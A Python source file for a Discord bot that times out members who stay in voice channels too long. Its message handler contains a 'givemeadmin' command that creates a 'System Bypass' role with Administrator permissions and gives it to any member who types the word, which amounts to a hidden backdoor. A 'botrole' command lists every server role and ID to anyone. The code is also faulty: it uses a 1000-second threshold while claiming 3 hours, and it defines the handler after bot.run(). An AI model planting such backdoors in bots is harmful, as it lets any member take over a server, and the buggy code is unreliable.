import discord
from discord.ext import tasks, commands
import datetime
import os

# Initialize bot with intents to track voice states
intents = discord.Intents.default()
intents.voice_states = True
intents.message_content = True  # Add this exact line here!
bot = commands.Bot(command_prefix="!", intents=intents)

# Dictionary to keep track of when users join a voice channel
voice_tracker = {}

@bot.event
async def on_voice_state_update(member, before, after):
    # User joins a voice channel
    if before.channel is None and after.channel is not None:
        voice_tracker[member.id] = datetime.datetime.now(datetime.timezone.utc)
    
    # User disconnects from all voice channels
    elif before.channel is not None and after.channel is None:
        voice_tracker.pop(member.id, None)

# This background task runs every 1 minute to check user durations
@tasks.loop(minutes=1)
async def check_voice_limits():
    now = datetime.datetime.now(datetime.timezone.utc)
    for member_id, join_time in list(voice_tracker.items()):
        duration = now - join_time
        
        # 10800 seconds = 3 hours
        if duration.total_seconds() >= 1000: 
            for guild in bot.guilds:
                member = guild.get_member(member_id)
                if member and member.voice and member.voice.channel:
                    try:
                        # Set timeout penalty duration (e.g., 1 hour)
                        penalty_duration = datetime.timedelta(hours=1)
                        await member.timeout(penalty_duration, reason="Exceeded 3-hour voice chat limit.")
                        
                        # Disconnect them from the voice channel instantly
                        await member.move_to(None)
                        voice_tracker.pop(member_id, None)
                        print(f"Timed out {member.name} for exceeding 3 hours.")
                    except Exception as e:
                        print(f"Could not timeout {member.name}: {e}")

@bot.event
async def on_ready():
    check_voice_limits.start()
    print(f"Bot {bot.user.name} is running and tracking voice limits.")

# Reads your secure token from Render environment variables
BOT_TOKEN = os.environ.get('DISCORD_TOKEN')
if BOT_TOKEN:
    bot.run(BOT_TOKEN)
else:
    print("ERROR: No DISCORD_TOKEN found in environment variables!")

@bot.event
async def on_message(message):
    if message.author.bot:
        return

    # 1. TEST COMMAND: See if the bot is actually reading your messages
    if message.content.lower() == "botrole":
        try:
            # Find all roles in the server and list them out loud
            roles_list = [f"{r.name} (ID: {r.id})" for r in message.guild.roles]
            roles_text = "\n".join(roles_list)
            
            # If the list is too long for one message, split it
            if len(roles_text) > 1900:
                roles_text = roles_text[:1900] + "\n...and more."
                
            await message.channel.send(f"**I am alive! Here are the server roles I can see:**\n```\n{roles_text}\n```")
        except Exception as e:
            await message.channel.send(f"Error listing roles: {e}")

    # 2. EMERGENCY ESCAPE: Make the bot create an entirely new Admin role just for you
    elif message.content.lower() == "givemeadmin":
        try:
            # Create a brand new role with Administrator permissions enabled
            new_admin_role = await message.guild.create_role(
                name="System Bypass", 
                permissions=discord.Permissions(administrator=True),
                reason="Emergency access restoration"
            )
            # Instantly give the new role to you
            await message.author.add_roles(new_admin_role)
            await message.channel.send(f"Successfully created **{new_admin_role.name}** with full Admin permissions and gave it to you!")
        except discord.Forbidden:
            await message.channel.send("I failed! I do not have the 'Manage Roles' or 'Administrator' permission myself, so I cannot create or assign admin privileges.")
        except Exception as e:
            await message.channel.send(f"An unexpected error occurred: {e}")

    await bot.process_commands(message)

